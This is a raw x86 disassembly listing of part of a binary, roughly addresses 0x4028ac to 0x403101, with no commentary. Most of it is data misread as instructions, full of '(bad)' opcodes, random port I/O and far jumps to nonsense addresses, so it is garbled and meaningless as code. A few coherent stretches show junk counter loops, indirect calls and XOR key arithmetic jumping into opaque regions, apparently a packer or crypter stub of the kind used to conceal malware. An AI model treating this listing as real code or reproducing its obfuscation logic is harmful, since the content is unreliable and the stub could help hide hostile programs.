  4028ac:	mov    edi,0xdd5582b0
  4028b1:	mov    cl,0xad
  4028b3:	sbb    BYTE PTR [esi+0x63],dl
  4028b6:	add    edi,DWORD PTR [ecx]
  4028b8:	leave  
  4028b9:	xor    ebp,eax
  4028bb:	iret   
  4028bc:	mov    cl,0xe5
  4028be:	icebp  
  4028bf:	and    eax,DWORD PTR gs:[edx]
  4028c2:	scas   eax,DWORD PTR es:[edi]
  4028c3:	and    ah,BYTE PTR [eax+0x6b]
  4028c6:	test   ebp,ebx
  4028c8:	push   ebx
  4028c9:	lahf   
  4028ca:	sub    ebp,ecx
  4028cc:	push   0x4c
  4028ce:	test   al,0x65
  4028d0:	push   ebp
  4028d1:	out    dx,al
  4028d2:	inc    esi
  4028d3:	les    eax,FWORD PTR [ecx+esi*2]
  4028d6:	xchg   ecx,eax
  4028d7:	and    eax,0xd41e9192
  4028dc:	cwde   
  4028dd:	push   ebp
  4028de:	in     eax,dx
  4028df:	lods   al,BYTE PTR ds:[esi]
  4028e0:	addr16 jo 0x4028cd
  4028e3:	(bad)  [edx+0x2c]
  4028e6:	arpl   WORD PTR [eax],dx
  4028e8:	push   ecx
  4028e9:	adc    esi,DWORD PTR [ecx+0x3e]
  4028ec:	cli    
  4028ed:	mov    edx,DWORD PTR [ebx+0x26]
  4028f0:	in     al,dx
  4028f1:	icebp  
  4028f2:	xchg   DWORD PTR [esi],esi
  4028f4:	mov    dl,0xb6
  4028f6:	push   edx
  4028f7:	cmp    bl,BYTE PTR [esp+eax*4-0x419f9943]
  4028fe:	pusha  
  4028ff:	pop    ebp
  402900:	fnstcw WORD PTR ds:0x37ab29fe
  402906:	out    0x80,eax
  402908:	data16 loop 0x4028b0
  40290b:	ror    BYTE PTR [esi-0xf],cl
  40290e:	pop    eax
  40290f:	out    dx,eax
  402910:	jmp    0x4028fc
  402912:	mov    ch,0x3f
  402914:	out    dx,eax
  402915:	loope  0x402964
  402917:	(bad)  
  402919:	daa    
  40291a:	jno    0x402940
  40291c:	sahf   
  40291d:	bound  esp,QWORD PTR [ebp+0x2f0c3a73]
  402923:	cli    
  402924:	sub    eax,DWORD PTR [ecx+0x45630d99]
  40292a:	dec    ebp
  40292b:	push   ss
  40292c:	out    dx,al
  40292d:	shr    eax,1
  40292f:	jmp    0x4028e0
  402931:	sbb    ah,ah
  402933:	fcmovnu st,st(1)
  402935:	fadd   QWORD PTR [edx+0x52]
  402938:	and    BYTE PTR [eax+0x57d97f0c],0xca
  40293f:	dec    esi
  402940:	jmp    0x628e3583
  402945:	ret    0x9f4c
  402948:	inc    edx
  402949:	in     al,0x7
  40294b:	dec    ebp
  40294c:	rol    DWORD PTR [eax-0x1d],cl
  40294f:	ret    
  402950:	sub    edi,DWORD PTR [eax+0x116c34a1]
  402956:	sti    
  402957:	enter  0xc1a6,0x7
  40295b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40295c:	cmp    esi,DWORD PTR [eax+0xf72d2c]
  402962:	or     eax,0x5344cf63
  402967:	pop    esi
  402968:	leave  
  402969:	ret    0x4
  40296c:	push   ebp
  40296d:	mov    ebp,esp
  40296f:	sub    esp,0x28
  402972:	leave  
  402973:	ret    0x10
  402976:	push   ebp
  402977:	mov    ebp,esp
  402979:	push   ecx
  40297a:	or     eax,DWORD PTR ds:0x42fd5d
  402980:	push   ecx
  402981:	movzx  edx,WORD PTR ds:0x42e76f
  402988:	sbb    DWORD PTR ds:0x42e793,edx
  40298e:	mov    eax,0xf89c8531
  402993:	mov    DWORD PTR ds:0x42fd69,0x1a
  40299d:	cmp    DWORD PTR ds:0x42fd69,0x0
  4029a4:	je     0x402a39
  4029aa:	cmp    DWORD PTR ds:0x42fd69,0x24
  4029b1:	jne    0x4029cc
  4029b7:	push   0x42e1ac
  4029bc:	push   0x42e783
  4029c1:	push   0x59d6
  4029c6:	call   DWORD PTR ds:0x42e4cf
  4029cc:	mov    edx,DWORD PTR ds:0x42fd69
  4029d2:	dec    edx
  4029d3:	mov    DWORD PTR ds:0x42fd69,edx
  4029d9:	jmp    0x40299d
  4029de:	mov    DWORD PTR ds:0x42e77f,0x19
  4029e8:	cmp    DWORD PTR ds:0x42e77f,0x0
  4029ef:	je     0x402a39
  4029f5:	cmp    DWORD PTR ds:0x42e77f,0x4
  4029fc:	jne    0x402a0d
  402a02:	push   0x5bc5
  402a07:	call   DWORD PTR ds:0x42e353
  402a0d:	cmp    DWORD PTR ds:0x42e77f,0x5
  402a14:	jne    0x402a27
  402a1a:	mov    edx,DWORD PTR ds:0x42e77f
  402a20:	dec    edx
  402a21:	mov    DWORD PTR ds:0x42e77f,edx
  402a27:	mov    edx,DWORD PTR ds:0x42e77f
  402a2d:	dec    edx
  402a2e:	mov    DWORD PTR ds:0x42e77f,edx
  402a34:	jmp    0x4029e8
  402a39:	mov    DWORD PTR [ebp-0x8],eax
  402a3c:	mov    DWORD PTR [ebp-0x4],0xf89c8530
  402a43:	mov    edx,DWORD PTR [ebp-0x8]
  402a46:	mov    ecx,DWORD PTR ds:0x42fe2e
  402a4c:	mov    ecx,DWORD PTR [ecx]
  402a4e:	xor    DWORD PTR ds:0x42fd55,ecx
  402a54:	push   esi
  402a55:	mov    ecx,0x7510855
  402a5a:	or     DWORD PTR ds:0x42fd8d,ebx
  402a60:	xor    edx,ecx
  402a62:	sbb    esi,0x5361
  402a68:	mov    esi,0x32729c
  402a6d:	sbb    DWORD PTR ds:0x42e1a8,0x657d
  402a77:	push   edi
  402a78:	and    DWORD PTR ds:0x42e1a8,0x0
  402a82:	jmp    0x402a94
  402a87:	mov    edi,DWORD PTR ds:0x42e1a8
  402a8d:	inc    edi
  402a8e:	mov    DWORD PTR ds:0x42e1a8,edi
  402a94:	cmp    DWORD PTR ds:0x42e1a8,0x10
  402a9b:	jae    0x402abe
  402aa1:	cmp    DWORD PTR ds:0x42e1a8,0x11
  402aa8:	jne    0x402ab9
  402aae:	push   0x42e1c1
  402ab3:	call   DWORD PTR ds:0x42e4d3
  402ab9:	jmp    0x402a87
  402abe:	mov    edi,DWORD PTR [ebp+0x10]
  402ac1:	add    edx,esi
  402ac3:	cmp    edi,edx
  402ac5:	je     0x4036ba
  402acb:	mov    edx,DWORD PTR [ebp-0x8]
  402ace:	mov    eax,DWORD PTR [ebp-0x4]
  402ad1:	xor    eax,ecx
  402ad3:	mov    edi,0xffcd8d64
  402ad8:	sub    edi,eax
  402ada:	add    edi,DWORD PTR [ebp+0x10]
  402add:	xor    edx,ecx
  402adf:	jmp    0x402dbe
  402ae4:	imul   ebx,DWORD PTR [edx],0xffffff8f
  402ae7:	cmp    BYTE PTR [ebp+0x71],cl
  402aea:	jae    0x402a9d
  402aec:	jl     0x402b40
  402aee:	dec    esi
  402aef:	mov    esp,0x6659da8c
  402af4:	jo     0x402b02
  402af6:	jo     0x402b68
  402af8:	mov    esi,0x3770707e
  402afd:	push   edx
  402afe:	mov    dh,BYTE PTR [edi]
  402b00:	xlat   BYTE PTR ds:[ebx]
  402b01:	mov    dh,0x73
  402b03:	test   eax,0xb00a16e
  402b08:	sbb    eax,0x53fd7b55
  402b0d:	cdq    
  402b0e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402b0f:	cdq    
  402b10:	adc    al,0xfb
  402b12:	lahf   
  402b13:	pop    edi
  402b14:	jnp    0x402aad
  402b16:	jg     0x402b84
  402b18:	add    al,0x7
  402b1a:	imul   edx,DWORD PTR ds:0xa43a9eaa,0xe80ee545
  402b24:	mov    esp,0x60f8b8c0
  402b29:	dec    ebp
  402b2a:	(bad)  
  402b2b:	mov    eax,0x2055f3fa
  402b30:	inc    ebp
  402b31:	xchg   ebp,eax
  402b32:	fwait
  402b33:	xor    dh,al
  402b35:	inc    esp
  402b36:	xlat   BYTE PTR ds:[ebx]
  402b37:	add    BYTE PTR gs:[esi-0x672198b7],bh
  402b3e:	cmc    
  402b3f:	mov    ebx,0x2b989038
  402b44:	ins    BYTE PTR es:[edi],dx
  402b45:	in     eax,0x3d
  402b47:	inc    edi
  402b48:	pop    edx
  402b49:	push   ds
  402b4a:	and    al,0x6d
  402b4c:	add    DWORD PTR [ebx+eax*1+0x39223510],ecx
  402b53:	js     0x402b56
  402b55:	in     eax,dx
  402b56:	and    ch,BYTE PTR [ebx]
  402b58:	jge    0x402bc5
  402b5a:	pop    ebx
  402b5b:	or     esi,DWORD PTR [eax+0x15]
  402b5e:	push   es
  402b5f:	adc    BYTE PTR [ecx],ch
  402b61:	imul   DWORD PTR [edx+0xb06f452]
  402b67:	jmp    0x3229:0xa98d9fa1
  402b6e:	sub    DWORD PTR [esi+ebp*4],ecx
  402b71:	adc    cl,BYTE PTR fs:[esi+0x56840e20]
  402b78:	(bad)  
  402b79:	lea    esp,[edx-0x62]
  402b7c:	shr    DWORD PTR [ecx+esi*4-0x3aba13d6],cl
  402b83:	js     0x402bba
  402b85:	cmp    ah,ch
  402b87:	fwait
  402b88:	int    0xeb
  402b8a:	mov    al,ds:0xdbeceaf9
  402b8f:	ret    0x1592
  402b92:	arpl   WORD PTR [edx],bp
  402b94:	loop   0x402bc7
  402b96:	int3   
  402b97:	stos   BYTE PTR es:[edi],al
  402b98:	add    al,BYTE PTR [esp+edx*1+0x4b]
  402b9c:	mov    esp,0xbf74185b
  402ba1:	push   esi
  402ba2:	xchg   ebp,eax
  402ba3:	fcom   DWORD PTR [edx]
  402ba5:	test   BYTE PTR [ebp+0x46ad932b],bl
  402bab:	add    ebp,0x7f90c17f
  402bb1:	lahf   
  402bb2:	jp     0x402b57
  402bb4:	xor    al,BYTE PTR [edx+ebx*2-0x6aeec650]
  402bbb:	push   edx
  402bbc:	inc    esi
  402bbd:	jb     0x402c32
  402bbf:	iret   
  402bc0:	inc    edx
  402bc1:	xchg   edi,eax
  402bc2:	ret    
  402bc3:	push   ebx
  402bc4:	mov    WORD PTR [edx],?
  402bc6:	pop    DWORD PTR [eax]
  402bc8:	jb     0x402bbc
  402bca:	adc    eax,0xde17d9be
  402bcf:	in     eax,dx
  402bd0:	sbb    cl,bh
  402bd2:	addr16 iret 
  402bd4:	cmc    
  402bd5:	fsubr  st(6),st
  402bd7:	xor    DWORD PTR [eax-0x23afed4],edx
  402bdd:	inc    esp
  402bde:	jb     0x402be4
  402be0:	jns    0x402bee
  402be2:	inc    ecx
  402be3:	and    al,0xbd
  402be5:	mov    BYTE PTR [ebx-0x1225ad30],al
  402beb:	fdivr  QWORD PTR [eax+edx*1+0x3bce4f22]
  402bf2:	sub    ebp,0x52e0920d
  402bf8:	aad    0x87
  402bfa:	xchg   ebp,eax
  402bfb:	iretw  
  402bfd:	repnz fisttp DWORD PTR cs:[edi]
  402c01:	imul   ecx,DWORD PTR [eax+0x29ca926e],0xf63e18b3
  402c0b:	out    0x3b,al
  402c0d:	inc    esp
  402c0e:	dec    esi
  402c0f:	mov    edx,DWORD PTR [edi-0x28484d8b]
  402c15:	mov    DWORD PTR [edi],edi
  402c17:	cli    
  402c18:	sub    ebx,DWORD PTR [edi-0x5e]
  402c1b:	add    dl,ah
  402c1d:	cmp    ebp,eax
  402c1f:	call   0xc6d74d83
  402c24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402c25:	loope  0x402c45
  402c27:	fcom   DWORD PTR [eax+0x726de0ae]
  402c2d:	pop    ebp
  402c2e:	call   0xfd9a2d2e
  402c33:	inc    edx
  402c34:	in     eax,0x1d
  402c36:	sub    edi,ecx
  402c38:	dec    ebx
  402c39:	popa   
  402c3a:	out    0x88,eax
  402c3c:	ret    
  402c3d:	push   edx
  402c3e:	ins    DWORD PTR es:[edi],dx
  402c3f:	add    ah,0x86
  402c42:	and    DWORD PTR [esi+0x65412bb],ebx
  402c48:	fnstsw WORD PTR [ecx+esi*8+0x4c]
  402c4c:	sub    eax,0xf2861af2
  402c51:	lds    esi,FWORD PTR [ebx-0x48]
  402c54:	nop
  402c55:	inc    ebx
  402c56:	push   0x178ac84
  402c5b:	icebp  
  402c5c:	add    dh,BYTE PTR [esi+0x1a]
  402c5f:	cmp    eax,0x831eb4ec
  402c64:	loope  0x402c34
  402c66:	gs stos DWORD PTR es:[edi],eax
  402c68:	pop    es
  402c69:	sub    al,0xb3
  402c6b:	test   eax,0x56e881e9
  402c70:	inc    edx
  402c71:	xchg   cl,dh
  402c73:	sbb    al,0x6a
  402c75:	dec    edi
  402c76:	clc    
  402c77:	inc    edx
  402c78:	sbb    DWORD PTR [edi+0x4a],0x5e
  402c7c:	ror    BYTE PTR [edx-0x15be0282],1
  402c82:	cmp    DWORD PTR [edx-0x27aaec4d],ecx
  402c88:	cmp    eax,ebx
  402c8a:	jecxz  0x402c12
  402c8c:	retf   0x1ff1
  402c8f:	pop    ebp
  402c90:	outs   dx,BYTE PTR ds:[esi]
  402c91:	mov    esp,0xa2346cc9
  402c96:	pop    eax
  402c97:	lahf   
  402c98:	pop    ebx
  402c99:	sbb    ebp,0x3d8be0a3
  402c9f:	popa   
  402ca0:	or     al,0x1c
  402ca2:	jmp    0xf10243e5
  402ca7:	xor    DWORD PTR [edx],eax
  402ca9:	retf   0x413b
  402cac:	outs   dx,BYTE PTR ds:[esi]
  402cad:	xlat   BYTE PTR ds:[ebx]
  402cae:	cmp    al,0xe5
  402cb0:	fiadd  DWORD PTR [edx]
  402cb2:	retf   
  402cb3:	sub    al,0x5f
  402cb5:	xchg   ecx,eax
  402cb6:	and    eax,0xfa83a317
  402cbb:	in     eax,0x28
  402cbd:	(bad)  
  402cbe:	daa    
  402cbf:	mov    DWORD PTR [eax],edi
  402cc1:	ret    
  402cc2:	xor    BYTE PTR [eax-0x5d907fd9],0x8d
  402cc9:	dec    edx
  402cca:	mov    ah,0xe0
  402ccc:	cs mov gs,esp
  402ccf:	cmp    eax,0x5abe9ada
  402cd4:	lds    esp,FWORD PTR [ebx-0x26]
  402cd7:	jge    0x402c68
  402cd9:	loope  0x402d16
  402cdb:	call   0xe3d8b91c
  402ce0:	scas   al,BYTE PTR es:[edi]
  402ce1:	retf   0x64ff
  402ce4:	loopne 0x402d1d
  402ce6:	(bad)  
  402ce7:	imul   ebp,DWORD PTR [eax-0x533b23f0],0x73d416b
  402cf1:	sub    BYTE PTR [ecx+0x3c],bh
  402cf4:	es mov esi,0x49f24688
  402cfa:	push   0xffffffdb
  402cfc:	ins    DWORD PTR es:[edi],dx
  402cfd:	cdq    
  402cfe:	enterw 0xe111,0x36
  402d03:	mov    ds:0xcf534ea7,eax
  402d08:	loopne 0x402cfc
  402d0a:	jmp    0x402d6d
  402d0c:	cdq    
  402d0d:	inc    ecx
  402d0e:	sub    bl,dl
  402d10:	stos   DWORD PTR es:[edi],eax
  402d11:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402d12:	push   0xaf4fcc16
  402d17:	stc    
  402d18:	adc    ch,BYTE PTR [edx-0x4cd270f8]
  402d1e:	mov    bl,0xfd
  402d20:	stc    
  402d21:	gs fs jle 0x402d6c
  402d25:	in     al,dx
  402d26:	xor    cl,bh
  402d28:	jg     0x402d7a
  402d2a:	dec    edx
  402d2b:	add    al,0x54
  402d2d:	test   DWORD PTR [esi],esp
  402d2f:	lods   al,BYTE PTR ds:[esi]
  402d30:	out    dx,eax
  402d31:	mov    DWORD PTR [ecx],esp
  402d33:	outs   dx,BYTE PTR ds:[esi]
  402d35:	push   ebp
  402d36:	data16 mov bh,BYTE PTR [edx-0x488edef8]
  402d3d:	add    esi,DWORD PTR [edx-0x2f]
  402d40:	pop    ebp
  402d41:	xlat   BYTE PTR ds:[ebx]
  402d42:	mov    bh,0x65
  402d44:	dec    esi
  402d45:	hlt    
  402d46:	stos   DWORD PTR es:[edi],eax
  402d47:	jo     0x402d25
  402d49:	xchg   DWORD PTR [ebx-0x3b],ecx
  402d4c:	test   DWORD PTR [eax],edx
  402d4e:	shl    DWORD PTR [ecx],1
  402d50:	pop    eax
  402d51:	mov    eax,0x359dcd7
  402d56:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d57:	int    0xb8
  402d59:	push   cs
  402d5a:	imul   esi,edx,0xffffff8a
  402d5d:	push   0x64
  402d5f:	nop
  402d60:	sub    BYTE PTR [ecx],ah
  402d62:	(bad)  
  402d64:	or     BYTE PTR [edx*1-0x1afe279],0x26
  402d6c:	stos   DWORD PTR es:[edi],eax
  402d6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402d6e:	pop    es
  402d6f:	(bad)  
  402d70:	inc    ebp
  402d71:	jae    0x402dbe
  402d73:	imul   ebp,DWORD PTR [edi-0x26],0xa8a3ba0b
  402d7a:	das    
  402d7b:	sub    dh,dl
  402d7d:	and    BYTE PTR [esi+edx*2],0x56
  402d81:	(bad)  
  402d82:	mov    bl,0x8e
  402d84:	or     BYTE PTR [ebx+ebx*4-0xfe04b22],ah
  402d8b:	fidivr WORD PTR [edi+ecx*2]
  402d8e:	mov    ebx,0xcaab4c7f
  402d93:	fucomip st,st(4)
  402d95:	inc    ecx
  402d96:	push   ecx
  402d97:	mov    bh,0x51
  402d99:	sub    al,0x2
  402d9b:	mov    dl,ch
  402d9d:	push   ds
  402d9e:	cmc    
  402d9f:	aad    0x81
  402da1:	call   0x7d40:0x8fe201e2
  402da8:	mov    ecx,0x519ab2a3
  402dad:	div    DWORD PTR [ecx]
  402daf:	push   ds
  402db0:	jle    0x402d9d
  402db2:	repnz frstor [ebx+edx*2+0x5f69e41d]
  402dba:	sbb    DWORD PTR [esi-0x46],0x63
  402dbe:	add    edx,esi
  402dc0:	cmp    edx,edi
  402dc2:	ja     0x4036b5
  402dc8:	push   ebx
  402dc9:	jmp    0x4030b2
  402dce:	jmp    0x4030ad
  402dd3:	mov    ecx,0xe1afe4fc
  402dd8:	ja     0x402e2b
  402dda:	push   0xffffffa6
  402ddc:	aas    
  402ddd:	xchg   ebp,eax
  402dde:	out    dx,eax
  402ddf:	jle    0x402d91
  402de1:	movlps xmm7,QWORD PTR [esi-0x418f8ff6]
  402de8:	jle    0x402e5a
  402dea:	jo     0x402e1e
  402dec:	push   ds
  402ded:	test   eax,0xa275ccde
  402df2:	push   ebp
  402df3:	xchg   BYTE PTR [ebx-0x7befe8cb],al
  402df9:	cmp    bl,BYTE PTR [edi-0xf]
  402dfc:	mov    bh,BYTE PTR [esi+ebp*8]
  402dff:	mul    BYTE PTR [ebx-0x595e0f9]
  402e05:	fld    TBYTE PTR [eax+0x6e]
  402e08:	sub    al,0xf6
  402e0a:	outs   dx,DWORD PTR ds:[esi]
  402e0b:	adc    esp,esi
  402e0d:	je     0x402e74
  402e0f:	jns    0x402e8d
  402e11:	div    eax
  402e13:	call   0x9dc4:0xff4dcc44
  402e1a:	mov    esp,0x88176545
  402e1f:	lods   eax,DWORD PTR ds:[esi]
  402e20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402e21:	add    ah,BYTE PTR [edx-0x60]
  402e24:	push   es
  402e25:	mov    eax,ds:0xf86888ae
  402e2a:	mov    esi,0x23068f05
  402e2f:	pushf  
  402e30:	sub    edx,DWORD PTR [ebx+ebx*2+0x4e7ad4b9]
  402e37:	push   esp
  402e38:	jb     0x402e3e
  402e3a:	mov    DWORD PTR ds:[edi+0x68],ebp
  402e3e:	popf   
  402e3f:	inc    ebx
  402e40:	daa    
  402e41:	mov    DWORD PTR [ecx+esi*2],esi
  402e44:	test   DWORD PTR [edx-0x4d36500c],esp
  402e4a:	sub    DWORD PTR [esi-0x6c61fa7e],ecx
  402e50:	add    BYTE PTR [edi],0x25
  402e53:	popf   
  402e54:	outs   dx,BYTE PTR ds:[esi]
  402e55:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402e56:	jmp    0x402e71
  402e58:	adc    ch,BYTE PTR [esi]
  402e5a:	mov    ds:0x618bddb4,eax
  402e5f:	mov    ecx,0x4c0a9421
  402e64:	and    al,0x41
  402e66:	add    BYTE PTR [eax-0x1d8d792a],0xb6
  402e6d:	xor    bl,0xf1
  402e70:	aaa    
  402e71:	xchg   BYTE PTR [eax+0x32],bl
  402e74:	cmp    eax,0x548758f4
  402e79:	push   0x323655ed
  402e7e:	pusha  
  402e7f:	sti    
  402e80:	loope  0x402e59
  402e82:	(bad)  
  402e83:	ds fs xchg esi,eax
  402e86:	fs js  0x402e99
  402e89:	imul   edx,DWORD PTR [edx+0x3d],0xbe50304
  402e90:	push   edi
  402e91:	inc    ebx
  402e92:	cmp    esp,DWORD PTR [eax-0x2cd6832]
  402e98:	jp     0x402e29
  402e9a:	sub    cl,ah
  402e9c:	int3   
  402e9d:	sub    DWORD PTR [edx-0x61ed2c8a],esp
  402ea3:	jmp    0xda896ba7
  402ea8:	push   edi
  402ea9:	xor    DWORD PTR [esi-0x1d],edx
  402eac:	out    dx,al
  402ead:	cmp    dl,BYTE PTR [ebp-0x7999da99]
  402eb3:	pop    edi
  402eb4:	mov    dh,0x9b
  402eb6:	leave  
  402eb7:	mov    dh,0x4b
  402eb9:	dec    ebx
  402eba:	cwde   
  402ebb:	and    eax,0xe190a7ce
  402ec0:	jecxz  0x402edb
  402ec2:	adc    BYTE PTR [edx],bh
  402ec4:	mov    edx,0x1a12118d
  402ec9:	test   al,0x7e
  402ecb:	push   ebx
  402ecc:	or     al,0x4c
  402ece:	shl    edi,0xf6
  402ed1:	enter  0x2523,0x83
  402ed5:	inc    edi
  402ed6:	jnp    0x402f37
  402ed8:	pop    edx
  402ed9:	jae    0x402ee2
  402edb:	fadd   DWORD PTR [ecx+0x3df95e6c]
  402ee1:	mov    bh,0xd2
  402ee3:	or     al,dl
  402ee5:	or     DWORD PTR [edi],edx
  402ee7:	cmp    esp,DWORD PTR [ebp+0x624dc929]
  402eed:	jnp    0x402f46
  402eef:	sub    al,0x47
  402ef1:	sbb    edx,DWORD PTR ss:[ebx]
  402ef4:	add    ch,BYTE PTR ds:0x34ed79c1
  402efa:	icebp  
  402efb:	cmp    DWORD PTR [esi+eiz*2+0x2570073],0xe597b26f
  402f06:	int3   
  402f07:	adc    edi,eax
  402f09:	mov    sp,0x1c6f
  402f0d:	sub    BYTE PTR [ecx+ecx*1],bh
  402f10:	scas   al,BYTE PTR es:[edi]
  402f11:	fdivr  QWORD PTR [edx-0x2dd4c82b]
  402f17:	jge    0x402f90
  402f19:	jne    0x402f19
  402f1b:	and    DWORD PTR [edi+0x21c775a2],edx
  402f21:	pop    es
  402f22:	pop    esi
  402f23:	scas   eax,DWORD PTR es:[edi]
  402f24:	dec    esi
  402f25:	cmp    esp,DWORD PTR [esi+0x14f276bc]
  402f2b:	dec    edi
  402f2c:	fcmovnb st,st(6)
  402f2e:	mov    bh,0x37
  402f30:	mov    bh,0x81
  402f32:	loopne 0x402f4d
  402f34:	mov    eax,0xbf5c9492
  402f39:	push   ecx
  402f3a:	mov    edx,0x718bbaea
  402f3f:	jns    0x402f18
  402f41:	adc    eax,0x3e68f85d
  402f46:	mov    dl,0x38
  402f48:	aas    
  402f49:	psrlq  mm6,QWORD PTR [ecx]
  402f4c:	fisubr WORD PTR [ebp-0x628f8171]
  402f52:	push   cs
  402f53:	stos   BYTE PTR es:[edi],al
  402f54:	cs jle 0x402f02
  402f57:	mov    esi,eax
  402f59:	fld    QWORD PTR [ecx]
  402f5b:	sbb    al,0x63
  402f5d:	lods   eax,DWORD PTR ds:[esi]
  402f5e:	xchg   ebp,eax
  402f5f:	add    al,0x96
  402f61:	adc    ecx,eax
  402f63:	imul   edi,DWORD PTR [edx],0xffffff99
  402f66:	push   esp
  402f67:	sti    
  402f68:	jns    0x402f92
  402f6a:	cmc    
  402f6b:	inc    eax
  402f6c:	sub    eax,0xce3d52ed
  402f71:	imul   eax,DWORD PTR [eax-0x1a795feb],0x76
  402f78:	(bad)  
  402f79:	out    0xce,al
  402f7b:	jp     0x402f88
  402f7d:	push   ebx
  402f7e:	cmp    bl,BYTE PTR [edx+ebx*8]
  402f81:	scas   eax,DWORD PTR es:[edi]
  402f82:	das    
  402f83:	jmp    0xaeffbb70
  402f88:	push   esi
  402f89:	sub    bh,BYTE PTR [edx]
  402f8b:	sbb    BYTE PTR [ebx],0xc
  402f8e:	xor    al,0x22
  402f90:	fwait
  402f91:	mov    eax,0xb703c95c
  402f96:	fistp  QWORD PTR ss:[esi]
  402f99:	pcmpeqb mm3,QWORD PTR [ebx-0x55794d90]
  402fa0:	lds    esp,FWORD PTR [esi]
  402fa2:	sahf   
  402fa3:	push   ebx
  402fa4:	inc    esp
  402fa5:	or     bl,BYTE PTR [ebx]
  402fa7:	gs fucomip st,st(4)
  402faa:	cli    
  402fab:	retf   
  402fac:	mov    es,WORD PTR [eax+0x22f6f465]
  402fb2:	mov    dl,0x2b
  402fb4:	arpl   WORD PTR [ebx+0x6],si
  402fb7:	xor    BYTE PTR [edi+ecx*8-0x4262d87a],al
  402fbe:	retf   
  402fbf:	mov    ch,0x8e
  402fc1:	std    
  402fc2:	jo     0x402faf
  402fc4:	jp     0x40302f
  402fc6:	pop    ds
  402fc7:	xchg   ebp,eax
  402fc8:	js     0x402fca
  402fca:	add    eax,0xdbf67b17
  402fcf:	imul   esp,ebx,0x4
  402fd2:	pop    ss
  402fd3:	mov    ecx,0xd2d33210
  402fd8:	xchg   esi,eax
  402fd9:	adc    ebx,ebp
  402fdb:	jecxz  0x402f8e
  402fdd:	ret    
  402fde:	das    
  402fdf:	out    dx,eax
  402fe0:	xchg   edx,eax
  402fe1:	adc    eax,DWORD PTR [edi-0x51a16f28]
  402fe7:	or     DWORD PTR [ebp-0x47],edi
  402fea:	retf   0xc159
  402fed:	js     0x402fdd
  402fef:	push   edi
  402ff0:	jnp    0x402fb3
  402ff2:	inc    ebx
  402ff3:	loopne 0x402f7e
  402ff5:	pop    edx
  402ff6:	jnp    0x402f78
  402ff8:	(bad)  
  402ffa:	(bad)  
  402ffb:	imul   BYTE PTR [eax]
  402ffd:	loop   0x402fa8
  402fff:	jno    0x402f88
  403001:	pop    edi
  403002:	aad    0xd2
  403004:	out    0xa4,al
  403006:	shr    ch,1
  403008:	(bad)  
  403009:	cmc    
  40300a:	out    dx,al
  40300b:	dec    esi
  40300c:	add    BYTE PTR [ebp+0x659cea6e],ch
  403012:	or     bl,dh
  403014:	jmp    0xeb66:0xc8dbf2e3
  40301b:	cmp    BYTE PTR [ecx+0x39],dl
  40301e:	fisubr WORD PTR [ecx-0x72]
  403021:	push   0x6453d5b
  403026:	mov    ah,0x2f
  403028:	outs   dx,DWORD PTR ds:[esi]
  403029:	cmovb  edx,DWORD PTR [edi]
  40302c:	mov    esi,0xda940928
  403031:	dec    ecx
  403032:	arpl   di,bp
  403034:	ret    
  403035:	scas   eax,DWORD PTR es:[edi]
  403036:	pushf  
  403037:	test   edx,ebx
  403039:	xor    ebx,ebp
  40303b:	sub    esp,eax
  40303d:	std    
  40303e:	sub    BYTE PTR [esi],cl
  403040:	sub    al,0xcd
  403042:	iret   
  403043:	mov    esi,0x60145691
  403048:	push   ecx
  403049:	sbb    esp,DWORD PTR [eax*2+0x69dfec5e]
  403050:	je     0x4030ac
  403052:	cmp    DWORD PTR [edx],ebx
  403054:	cmp    DWORD PTR [ecx-0x38],edx
  403057:	push   ds
  403058:	aaa    
  403059:	in     al,dx
  40305a:	aaa    
  40305b:	shl    ch,0x7c
  40305e:	sbb    DWORD PTR [ecx],esp
  403060:	push   ebx
  403061:	jmp    0xc197eb28
  403066:	sbb    ebx,DWORD PTR [edx+0x3cd676b]
  40306c:	ret    
  40306d:	mov    cl,0xbc
  40306f:	popf   
  403070:	xchg   ecx,eax
  403071:	adc    BYTE PTR [ecx+edi*4-0x2a20d4cd],ch
  403078:	jne    0x4030d7
  40307a:	sub    dh,al
  40307c:	(bad)  
  40307e:	mov    ch,0x9d
  403080:	adc    ch,ch
  403082:	sub    eax,0x3702d33
  403087:	jae    0x403083
  403089:	push   es
  40308a:	xchg   ebx,eax
  40308b:	rol    DWORD PTR es:[edi+0x4143f629],cl
  403092:	push   0x5f
  403094:	retf   0xafdf
  403097:	jge    0x403044
  403099:	sahf   
  40309a:	imul   ebx,DWORD PTR [edi],0xb671069
  4030a0:	pushw  0xccb9
  4030a4:	adc    BYTE PTR [eax],ah
  4030a6:	not    DWORD PTR [esi+ebx*1]
  4030a9:	lods   eax,DWORD PTR ds:[esi]
  4030aa:	fld    QWORD PTR [edx+0x729cbe84]
  4030b0:	xor    al,BYTE PTR [eax]
  4030b2:	mov    eax,DWORD PTR [ebp-0x8]
  4030b5:	mov    edi,DWORD PTR [ebp-0x4]
  4030b8:	xor    edi,ecx
  4030ba:	add    edi,esi
  4030bc:	jmp    0x40339b
  4030c1:	fist   DWORD PTR [ecx+0x4b76cc16]
  4030c7:	loope  0x40307a
  4030c9:	lds    edx,FWORD PTR [esi-0x42]
  4030cc:	add    al,0x2
  4030ce:	out    0x1d,eax
  4030d0:	and    esp,edi
  4030d2:	pop    ss
  4030d3:	jo     0x403145
  4030d5:	mov    esi,0x6570707e
  4030da:	outs   dx,BYTE PTR ds:[esi]
  4030db:	xor    al,0xa
  4030dd:	repz leave 
  4030df:	jae    0x403137
  4030e1:	and    BYTE PTR [ebx-0x26e89d33],dh
  4030e7:	adc    DWORD PTR [esi],esp
  4030e9:	pushf  
  4030ea:	pop    esp
  4030eb:	push   ecx
  4030ec:	test   al,0x5a
  4030ee:	jno    0x403136
  4030f0:	push   ebx
  4030f1:	int    0x31
  4030f3:	outs   dx,BYTE PTR ds:[esi]
  4030f4:	pop    ss
  4030f5:	mov    ?,WORD PTR [ecx]
  4030f7:	ins    BYTE PTR es:[edi],dx
  4030f8:	jl     0x4030dd
  4030fa:	es pop esp
  4030fc:	mov    ecx,0xd9422e15
  403101:	or     DWORD PTR [esi-0x3f9c68a0],eax
